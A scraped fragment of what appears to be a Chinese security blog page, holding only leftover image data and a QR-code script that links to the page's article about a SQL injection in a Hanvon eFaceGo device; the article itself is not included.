V+snyGQJ0SPOd7256+YyH0vazLKO0zlmvtz+oh9jHTiJv1MieUNhtEfyCni68aGbDdFKDjxK/PkHIs13DWQK4xh7KLMhBdl2esdBg4QHctswyCzzn7sz1Y8whzD2udcyyE2Af0KL41qLqWc39hyz2KofYtA3lUtPj3nEA3EKjTgt4/sy29Ss5Y7gXHa0FwuadrITioaE4IkZd/ZKO+WQvRY6SD4KDH3MP+qEfOdQNx4cLPnMAayGfO/XDVHx0IxLUdrQbBQcWsy9fWPoQ26+xDcNYKWw7qP9Obe4TqI8s6xTKINYFMd760so5oEtLIcvpHB5IbL//4BGbMjw5E05blBYHtR+Ccsw/BQUVzGdVTBud00tqg1gC57dAHtv1Cj6MCr5NxpIPjflC5Hx3IaCMr99wJrIE8d14vV3cDyVdv5H93R7nXrAfU6+saiNysLnMQeqgf6m0vqFyuHfmuHXFQ14K977ojhNBnvhvIaNGVe98JlIFATAvO4WyLUHt4+lBzs1rrha1OOVvLKYZYQ35rcMxl7ax/1tmf6SHWBCx/iGUgD5VL8JYTWAN5yzGfX+R/AAAA//+yKBxyAAAABklEQVQDAFiJuKcykX7XAAAAAElFTkSuQmCC)

手机扫码阅读


var qrcode = new QRCode(document.getElementById("posts-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/hanvon-efacego-getDoors-sqli.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});
 